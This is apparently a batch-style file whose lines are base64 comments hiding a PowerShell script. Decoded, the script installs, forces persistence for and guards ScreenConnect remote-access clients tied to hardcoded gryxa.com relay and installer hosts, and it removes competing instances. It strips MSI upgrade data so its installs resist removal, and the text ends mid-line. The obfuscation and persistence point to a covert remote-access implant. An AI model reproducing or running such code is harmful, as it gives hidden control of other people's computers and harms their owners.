::eyByZXR1cm4gJ09LJyB9DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJu
::ICdNSVNTSU5HJyB9DQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJu
::ICdSRUFSTUVEJyB9DQogICAgcmV0dXJuICdGQUlMJw0KfQ0KDQojIENvcnJlY3Qg
::MzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBh
::IHRydW5jYXRlZA0KIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29m
::dFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdA0KIyB3YXMgaW52
::aXNpYmxlIHRvIHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLg0KJHNjcmlw
::dDpVbmluc3RhbGxSb290cyA9IEAoDQogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgJ0hL
::TE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJl
::bnRWZXJzaW9uXFVuaW5zdGFsbCcNCikNCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lz
::dGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw4OiBORVZFUiB1
::c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMg
::dGhlDQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24g
::YWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nDQogICAgIyBhbmQgdGhlIG1vbiBv
::cnBoYW4tbGFkZGVyIGRlbGV0ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2Vz
::Lg0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2Vy
::dmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDMwOiBORVZFUiBy
::dW4gbXNpZXhlYyAvZmEgb3IgL2kgb24gYSBTY3JlZW5Db25uZWN0IHByb2R1Y3Qg
::4oCUIFNDIGluc3RhbmNlcyBzaGFyZQ0KICAgICMgbGVnYWN5IFVwZ3JhZGVDb2Rl
::cywgc28gYW55IG1zaWV4ZWMgcmVwYWlyL2luc3RhbGwgb24gb25lIEZQIHRyaWdn
::ZXJzIGENCiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCB0aGF0IGtub2NrcyB0
::aGUgR3J5eGEgc2libGluZyBPRkZMSU5FLiBTZXJ2aWNlLWxldmVsIGhlYWwgb25s
::eS4NCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcg
::fQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJp
::bnQpIg0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9DQog
::ICAgaWYgKCRzdmMpIHsNCiAgICAgICAgIyBwcmVzZW50IGJ1dCBzdG9wcGVkIC0+
::IHNlcnZpY2UtbGV2ZWwgc3RhcnQsIG5vIG1zaWV4ZWMNCiAgICAgICAgJiBzYy5l
::eGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYNCiAg
::ICAgICAgJiBzYy5leGUgc3RhcnQgIiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1zdGFydGVkJyB9DQog
::ICAgICAgIHJldHVybiAnc3ZjLXN0aWxsLXN0b3BwZWQtbm9yZXBhaXIobXNpZXhl
::Yy1kaXNhYmxlZCknDQogICAgfQ0KICAgICMgc2VydmljZSBlbnRyeSBnb25lOiBy
::ZS1jcmVhdGUgZnJvbSB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0J3MgaW5zdGFsbCBk
::aXIgV0lUSE9VVCBtc2lleGVjLg0KICAgICMgSWYgYmluYXJpZXMgZXhpc3QsIHNj
::LmV4ZSBjcmVhdGUgKyBzdGFydC4gRWxzZSByZXBvcnQgc28gY2FsbGVyIGNhbiBk
::ZWNpZGUgKG5ldmVyIC9mYSwgbmV2ZXIgL2kpLg0KICAgICRkaXIgPSAkbnVsbA0K
::ICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::LCAkZW52OlByb2dyYW1GaWxlcykpIHsNCiAgICAgICAgJGNhbmQgPSBKb2luLVBh
::dGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0K
::ICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRj
::YW5kICdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJykpIHsgJGRpciA9
::ICRjYW5kOyBicmVhayB9DQogICAgfQ0KICAgIGlmICgtbm90ICRkaXIpIHsgcmV0
::dXJuICdub3QtcmVnaXN0ZXJlZC1ub3JlcGFpcihtc2lleGVjLWRpc2FibGVkKScg
::fQ0KICAgICRleGUgPSBKb2luLVBhdGggJGRpciAnU2NyZWVuQ29ubmVjdC5DbGll
::bnRTZXJ2aWNlLmV4ZScNCiAgICAmIHNjLmV4ZSBjcmVhdGUgIiRuYW1lIiBiaW5Q
::YXRoPSAiYCIkZXhlYCIiIHN0YXJ0PSBhdXRvIERpc3BsYXlOYW1lPSAiJG5hbWUi
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiBy
::ZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9y
::ZXN0YXJ0LzUwMDAgMj4mMSB8IE91dC1OdWxsDQogICAgJiBzYy5leGUgc3RhcnQg
::IiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
::cyA1DQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
::YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJlY3JlYXRlZC1zdGFy
::dGVkJyB9DQogICAgcmV0dXJuICdzdmMtcmVjcmVhdGVkLW5vdC1ydW5uaW5nJw0K
::fQ0KDQojIOKUgOKUgCBHcnl4YSBTQyB2MiAoY2xlYW4gcmV3cml0ZSkg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQojIFNpbmds
::ZS1mbGlnaHQgZW5zdXJlLiBSdW5uaW5nID0+IGhlYWx0aHkuIFN0b3BwZWQgc3Zj
::ID0+IHN0YXJ0Lg0KIyBCcm9rZW4vU3R1Y2sgPT4gY2xlYW4tcmVpbnN0YWxsIG9u
::Y2UsIGRldGFjaGVkLiBBYnNlbnQgPT4gaW5zdGFsbCBvbmNlLg0KIyBObyAvZmEs
::IG5vIGlubGluZSBibG9ja2luZyAvaSwgbm8gZmFsc2UgImFscmVhZHlfcnVubmlu
::ZyIuDQokc2NyaXB0OkdyeXhhRGVmYXVsdEZwID0gJzM2ZTUwNmZmMDE2YjIxNTEn
::DQokc2NyaXB0OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jp
::bi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0
::Jw0KJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA9ICd1cGRhdGUuZ3J5eGEuY29tJw0K
::JHNjcmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nDQokc2NyaXB0OlNl
::dnJ6RGVmYXVsdFByaW1hcnkgPSAnNWY2MDEwNTc5ODUyZTUwNycNCiRzY3JpcHQ6
::U2V2cnpEZWZhdWx0QWx0ID0gJ2Y4NjFjODE0MGQ0NTM0MjcnDQokc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5LCAkc2NyaXB0
::OlNldnJ6RGVmYXVsdEFsdCkNCiMgU2V0IHRvIGEgMTYtaGV4IEZQIHlvdSBXQU5U
::IGluc3RhbGxlZCAoYWZ0ZXIgcm90YXRpbmcgb24gdGhlIHBhbmVsKS4gQW55IGhv
::c3QNCiMgcnVubmluZyBhIGRpZmZlcmVudCBGUCBtaWdyYXRlcyB0byB0aGlzIG9u
::ZS4gTGVhdmUgJycgdG8ganVzdCB0cmFjayB3aGF0ZXZlciBydW5zLg0KJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnAgPSAnMzZlNTA2ZmYwMTZiMjE1MScNCg0KIyBMNDA6
::IFJTQSBwdWJsaWMga2V5IGZvciB1cGRhdGUubWFuaWZlc3QgdmVyaWZpY2F0aW9u
::IChwcml2YXRlIGtleSBpbiBrZXlzLywgZ2l0aWdub3JlZCkNCiRzY3JpcHQ6VXBk
::YXRlUHViS2V5WG1sID0gQCcNCjxSU0FLZXlWYWx1ZT48TW9kdWx1cz50QUJaUG52
::c3Vwb3JpMTltdEpiSG9UMXVGR1ZMTktxT05CMHh0dklCSDRIcGZNNVUrU3RDdUdu
::RWRJeVB5a01RUGpERWxWQlpPZWE4cGRkQnh4UE1JOTRkNFZCcGR3blFlZFdIbG5s
::NkV1UXNKTDJNTWMweG8wZHV6cFFkUFZqRG5lSUl0T3hWTW5sNE1tVFNTOGkxNU9m
::TlRINnlkZGxmaTZ0TmZUdnZDdGt4bEw5YzBxWHh0SW9ZTFFMOWpDMjk0dDJPMHZP
::c0FsaWgwaFM2WEFHcDhPQVRLUi9LVlBwOHFmdzh0enJTdktnWWtwZTc5Yko2N2J0
::ak83cVRIdjFKcFAwNHhlWXRDS2pTRk42WGgwMmRydHF2eXVDSHZ3MSswSFlmdmlh
::SDV5TkFwd29OeC9mNVU2M3VNaWlyS3VKYVpNQnZYTTh1bXh5a0FHcnFkU1UwcFE9
::PTwvTW9kdWx1cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PC9SU0FLZXlWYWx1
::ZT4NCidADQoNCmZ1bmN0aW9uIEdldC1Hcnl4YUNmZ1BhdGggeyBKb2luLVBhdGgg
::JFdvcmtEaXIgJ2dyeXhhLmNmZycgfQ0KZnVuY3Rpb24gR2V0LVNldnJ6Q2ZnUGF0
::aCB7IEpvaW4tUGF0aCAkV29ya0RpciAnc2V2cnouY2ZnJyB9DQoNCmZ1bmN0aW9u
::IEdldC1TZXZyektlZXAgew0KICAgICRwcmltID0gJHNjcmlwdDpTZXZyekRlZmF1
::bHRQcmltYXJ5DQogICAgJGFsdCA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0DQog
::ICAgJHAgPSBHZXQtU2V2cnpDZmdQYXRoDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
::ICRwIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
::Y3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlBSSU1BUllfRlA9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeQUxUX0ZQPShbMC05
::YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIo
::KSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfUFJJTUFS
::WT0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRwcmltID0gJG1hdGNoZXNbMV0u
::VG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15FWFBFQ1RF
::RF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNb
::MV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHByaW0sICRhbHQpDQogICAgcmV0dXJuIEAoJHByaW0sICRh
::bHQpDQp9DQoNCmZ1bmN0aW9uIFNldC1TZXZyekZwKFtzdHJpbmddJFByaW1hcnks
::IFtzdHJpbmddJEFsdCkgew0KICAgIGlmICgtbm90ICRQcmltYXJ5KSB7ICRQcmlt
::YXJ5ID0gJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5IH0NCiAgICBpZiAoLW5v
::dCAkQWx0KSB7ICRBbHQgPSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdCB9DQogICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7IE5l
::dy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNl
::IHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJQUklNQVJZX0ZQPSQoJFBy
::aW1hcnkuVG9Mb3dlcigpKSIsDQogICAgICAgICJBTFRfRlA9JCgkQWx0LlRvTG93
::ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfUFJJTUFSWT0kKCRQcmltYXJ5LlRv
::TG93ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfQUxUPSQoJEFsdC5Ub0xvd2Vy
::KCkpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVyc2Fs
::VGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggKEdldC1TZXZyekNmZ1BhdGgpIC1FbmNvZGluZyBBU0NJSSAtRm9y
::Y2UNCiAgICAkc2NyaXB0OlNldnJ6S2VlcCA9IEAoJFByaW1hcnkuVG9Mb3dlcigp
::LCAkQWx0LlRvTG93ZXIoKSkNCn0NCg0KZnVuY3Rpb24gU3luYy1TZXZyekV4cGVj
::dGVkKFtzdHJpbmddJEV4cGVjdGVkVGV4dCkgew0KICAgICMgQXBwbHkgcmVwbyBz
::ZXZyel9leHBlY3RlZC5jZmcgYm9keSAoRVhQRUNURURfUFJJTUFSWT0vRVhQRUNU
::RURfQUxUPSBsaW5lcykNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwN
::CiAgICBmb3JlYWNoICgkbGluZSBpbiAoJEV4cGVjdGVkVGV4dCAtc3BsaXQgImBy
::P2BuIikpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX1BS
::SU1BUlk9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKSB9DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBF
::Q1RFRF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNo
::ZXNbMV0uVG9Mb3dlcigpIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJHByaW0pIHsg
::JHByaW0gPSAoR2V0LVNldnJ6S2VlcClbMF0gfQ0KICAgIGlmICgtbm90ICRhbHQp
::IHsgJGFsdCA9IChHZXQtU2V2cnpLZWVwKVsxXSB9DQogICAgU2V0LVNldnJ6RnAg
::JHByaW0gJGFsdA0KICAgIHJldHVybiAiU0VWUlp8JHByaW18JGFsdCINCn0NCg0K
::ZnVuY3Rpb24gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZShbc3RyaW5nXSRNc2lQYXRo
::KSB7DQogICAgIyBMNDAvTDQ0OiBjb3B5IE1TSSBhbmQgREVMRVRFIEZST00gVXBn
::cmFkZSBzbyAvaSBjYW5ub3QgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBzaWJsaW5n
::cy4NCiAgICAjIEw0NDogdmVyaWZ5IFVwZ3JhZGUgaXMgZW1wdHkgYWZ0ZXIgREVM
::RVRFIOKAlCBuZXZlciByZXR1cm4gYSBzdGlsbC1kYW5nZXJvdXMgTVNJLg0KICAg
::IGlmICgtbm90ICRNc2lQYXRoIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQ
::YXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgICRzYWZlID0gSm9p
::bi1QYXRoICRlbnY6VEVNUCAoInNjX3NhZmVfezB9Lm1zaSIgLWYgW2d1aWRdOjpO
::ZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkNCiAgICB0cnkgew0KICAgICAgICBDb3B5
::LUl0ZW0gLUxpdGVyYWxQYXRoICRNc2lQYXRoIC1EZXN0aW5hdGlvbiAkc2FmZSAt
::Rm9yY2UNCiAgICAgICAgJGkgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93
::c0luc3RhbGxlci5JbnN0YWxsZXINCiAgICAgICAgJGRiID0gJGkuT3BlbkRhdGFi
::YXNlKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKS5QYXRoLCAxKQ0K
::ICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHYgPSAkZGIuT3BlblZpZXcoJ0RF
::TEVURSBGUk9NIGBVcGdyYWRlYCcpDQogICAgICAgICAgICAkdi5FeGVjdXRlKCkg
::fCBPdXQtTnVsbA0KICAgICAgICAgICAgJGRiLkNvbW1pdCgpDQogICAgICAgIH0g
::Y2F0Y2ggew0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRz
::YWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
::ICAgICAgcmV0dXJuICRudWxsDQogICAgICAgIH0NCiAgICAgICAgIyB2ZXJpZnkg
::ZW1wdHkNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRkYjIgPSAkaS5PcGVu
::RGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJHNhZmUpLlBhdGgs
::IDApDQogICAgICAgICAgICAkYyA9ICRkYjIuT3BlblZpZXcoJ1NFTEVDVCBgVXBn
::cmFkZUNvZGVgIEZST00gYFVwZ3JhZGVgJykNCiAgICAgICAgICAgICRjLkV4ZWN1
::dGUoKSB8IE91dC1OdWxsDQogICAgICAgICAgICBpZiAoJGMuRmV0Y2goKSkgew0K
::ICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkc2FmZSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::ICAgICByZXR1cm4gJG51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRj
::aCB7DQogICAgICAgICAgICAjIG1pc3NpbmcgVXBncmFkZSB0YWJsZSA9IGFscmVh
::ZHkgc2FmZQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkc2FmZQ0KICAgIH0g
::Y2F0Y2ggew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkc2Fm
::ZSkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgcmV0dXJuICRudWxs
::DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVVwZGF0ZU1hbmlmZXN0KFtzdHJp
::bmddJE1hbmlmZXN0UGF0aCwgW3N0cmluZ10kU2lnUGF0aCwgW2hhc2h0YWJsZV0k
::RmlsZU1hcCkgew0KICAgICMgVmVyaWZ5IFJTQS1TSEEyNTYgc2lnbmF0dXJlIG92
::ZXIgdXBkYXRlLm1hbmlmZXN0LCB0aGVuIFNIQTI1NiBvZiBlYWNoIHN0YWdlZCBm
::aWxlLg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNYW5p
::ZmVzdFBhdGgpIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRTaWdQ
::YXRoKSkgeyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBpZiAoLW5vdCAkc2NyaXB0
::OlVwZGF0ZVB1YktleVhtbCAtb3IgJHNjcmlwdDpVcGRhdGVQdWJLZXlYbWwgLW1h
::dGNoICdQTEFDRUhPTERFUicpIHsgcmV0dXJuICduby1wdWJrZXknIH0NCiAgICB0
::cnkgew0KICAgICAgICAkYnl0ZXMgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygo
::UmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQYXRoKS5QYXRoKQ0K
::ICAgICAgICAkc2lnID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChbSU8u
::RmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRT
::aWdQYXRoKS5QYXRoKS5UcmltKCkpKQ0KICAgICAgICAkcnNhID0gW1N5c3RlbS5T
::ZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBXTo6Q3JlYXRlKCkNCiAgICAgICAgJHJz
::YS5Gcm9tWG1sU3RyaW5nKCRzY3JpcHQ6VXBkYXRlUHViS2V5WG1sKQ0KICAgICAg
::ICBpZiAoLW5vdCAkcnNhLlZlcmlmeURhdGEoJGJ5dGVzLCAkc2lnLCBbU3lzdGVt
::LlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1
::NiwgW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBU2lnbmF0dXJlUGFk
::ZGluZ106OlBrY3MxKSkgew0KICAgICAgICAgICAgcmV0dXJuICdiYWQtc2lnJw0K
::ICAgICAgICB9DQogICAgICAgICRkb2MgPSBHZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJE1hbmlmZXN0UGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAg
::ICBmb3JlYWNoICgkbmFtZSBpbiAkRmlsZU1hcC5LZXlzKSB7DQogICAgICAgICAg
::ICAkcGF0aCA9ICRGaWxlTWFwWyRuYW1lXQ0KICAgICAgICAgICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHBhdGgpKSB7IHJldHVybiAibWlzc2lu
::Zy1maWxlOiRuYW1lIiB9DQogICAgICAgICAgICAkd2FudCA9IFtzdHJpbmddJGRv
::Yy5maWxlcy4kbmFtZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHdhbnQpIHsgcmV0
::dXJuICJub3QtaW4tbWFuaWZlc3Q6JG5hbWUiIH0NCiAgICAgICAgICAgICRzaGEg
::PSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUo
::KQ0KICAgICAgICAgICAgJGZzID0gW0lPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2
::ZS1QYXRoIC1MaXRlcmFsUGF0aCAkcGF0aCkuUGF0aCkNCiAgICAgICAgICAgIHRy
::eSB7ICRoYXNoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc2hhLkNvbXB1
::dGVIYXNoKCRmcykpKS5SZXBsYWNlKCctJywgJycpLlRvTG93ZXIoKSB9DQogICAg
::ICAgICAgICBmaW5hbGx5IHsgJGZzLkNsb3NlKCkgfQ0KICAgICAgICAgICAgaWYg
::KCRoYXNoIC1uZSAkd2FudC5Ub0xvd2VyKCkpIHsgcmV0dXJuICJoYXNoLW1pc21h
::dGNoOiRuYW1lIiB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICdvaycNCiAg
::ICB9IGNhdGNoIHsgcmV0dXJuICJlcnJvcjokKCRfLkV4Y2VwdGlvbi5NZXNzYWdl
::KSIgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFGcCB7DQogICAgJGZwID0gJHNj
::cmlwdDpHcnl4YURlZmF1bHRGcA0KICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0aA0K
::ICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSB7DQogICAgICAgIEdl
::dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgkXyAt
::bWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZw
::ID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAg
::ICByZXR1cm4gJGZwDQp9DQoNCmZ1bmN0aW9uIFNldC1Hcnl4YUZwKFtzdHJpbmdd
::JEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJl
::dHVybiB9DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdv
::cmtEaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdv
::cmtEaXIgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJDVVJS
::RU5UX0ZQPSQoJEZpbmdlcnByaW50LlRvTG93ZXIoKSkiLA0KICAgICAgICAiUkVM
::QVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlIb3N0KSIsDQogICAgICAgICJVST0kKCRz
::Y3JpcHQ6R3J5eGFVaUhvc3QpIiwNCiAgICAgICAgIk1TSVVSTD0kKCRzY3JpcHQ6
::R3J5eGFNc2lVcmwpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRv
::VW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YUNmZ1BhdGgpIC1FbmNvZGluZyBB
::U0NJSSAtRm9yY2UNCn0NCg0KIyBMMzk6IG5ldmVyIGFkb3B0IGEgZm9yZWlnbiBT
